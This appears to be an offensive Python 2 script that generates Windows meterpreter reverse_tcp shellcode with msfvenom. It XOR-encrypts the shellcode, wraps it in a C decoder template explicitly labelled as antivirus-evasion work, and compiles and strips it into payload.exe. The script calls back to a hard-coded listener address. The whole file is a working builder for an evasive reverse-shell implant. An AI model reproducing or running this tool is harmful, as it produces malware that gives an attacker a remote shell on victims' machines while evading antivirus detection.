import os
import random

def generate_shellcode(lhost, lport, payload):
    res = os.system('msfvenom -f py -p ' + payload + ' LHOST=' + lhost + ' LPORT=' + str(lport) + ' -o shellcode.py')
    
    if res != 0:
        raise Exception('msfvenom failed with result ' + res)

    fd = open('shellcode.py', 'r')
    code = fd.read()
    fd.close()
    buf = ""

    exec(code)

    shellcode = [x for x in buf]
    length = len(shellcode)

    return (shellcode, length)

def xor_shellcode(buf, xorkey): 
    keylen = len(xorkey)
    return [chr(ord(x) ^ ord(xorkey[i % keylen])) for i,x in enumerate(buf)]
    
def generate_xor_key(size = 200):
    xorkey = [os.urandom(1) for _ in xrange(size)]
    return xorkey

def generate_xor_key_size():
    return random.randint(100,200)

def c_xor_buffer(buffer_name, key_name, key_size_name):
    c = ""
    c += "for(int i = 0; i < buflen; i++) {\n"
    c += "\t\t" + buffer_name + "[i] = " + buffer_name + "[i] ^ " + key_name + "[i % " + key_size_name + "];\n"
    c += "\t}"
    return c

def generate_payload(lhost, lport = 4444, payload = 'windows/meterpreter/reverse_tcp'):
    print "Generating Payload"
    
    buf, buflen = generate_shellcode(lhost, lport, payload)

    xorkey_size = generate_xor_key_size()
    xorkey = generate_xor_key(xorkey_size)

    buf = xor_shellcode(buf, xorkey)


    payload = 'int buflen = ' + str(buflen) + ';\n'
    payload += 'char buf[] = "' + "".join(["\\x%02x"%ord(x) for x in buf]) + '";\n'

    tpl_file = open('template.c', 'r')
    tpl = tpl_file.read()
    tpl_file.close()
    
    # Add payload
    tpl = tpl.replace('[[PAYLOAD]]', payload)

    # Add AV evasion work
    work = ""
    work += 'char xorkey[] = "' + "".join(["\\x%02x"%ord(x) for x in xorkey]) + '";\n\t'
    work += "int xorkey_size = " + str(xorkey_size) + ";\n\t"
    work += c_xor_buffer("buf", "xorkey", "xorkey_size")
    tpl = tpl.replace('[[WORK]]', work)
    
    fd = open('payload.c', 'w')
    fd.write(tpl)
    fd.close()
    
def build_payload(output = 'payload.exe'):
    ret = os.system('i686-w64-mingw32-gcc -mwindows payload.c -o ' + output)

    if ret != 0:
        raise Exception('build failed with error: ' + str(ret))

def strip_payload(output = 'payload.exe'):
    ret = os.system('strip --strip-unneeded -X ' + output)

    if ret != 0:
        raise Exception('strip failed with error: ' + str(ret))

generate_payload('172.21.35.1')
build_payload()
strip_payload()